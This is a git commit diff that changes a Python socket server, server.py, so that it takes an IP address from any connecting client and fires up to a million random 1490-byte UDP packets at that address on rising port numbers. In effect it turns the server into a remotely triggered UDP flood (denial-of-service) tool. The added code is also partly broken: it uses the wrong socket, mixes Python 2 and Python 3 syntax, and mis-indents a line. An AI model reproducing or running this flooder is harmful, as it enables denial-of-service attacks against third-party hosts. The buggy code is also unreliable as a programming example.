beb8383c967ceebfd4bda2dbf3362203a1605d42
Kamakepar2029 <58629552+Kamakepar2029@users.noreply.github.com>
2020-07-21 18:21:48 +0300

    Update server.py

--- server.py
+++ server.py
@@ -1,5 +1,14 @@
 import socket
 from colorama import Fore, Back, Style
+
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+
 sock = socket.socket()
 
 sock.bind(('', 12456))
@@ -25,6 +34,29 @@ while True:
      try:
        data = conn.recv(1024).decode()
        print(data)
+       now = datetime.now()
+       hour = now.hour
+       minute = now.minute
+       day = now.day
+       month = now.month
+       year = now.year
+
+##############
+       socke = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+       bytes = random._urandom(1490)
+#############
+
+
+       ip = data
+       port = 80
+       sent = 0
+       while sent < 1000000:
+          sock.sendto(bytes, (ip,port))
+          sent = sent + 1
+          port = port + 1
+          print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
      except:
        pass
        if not data:
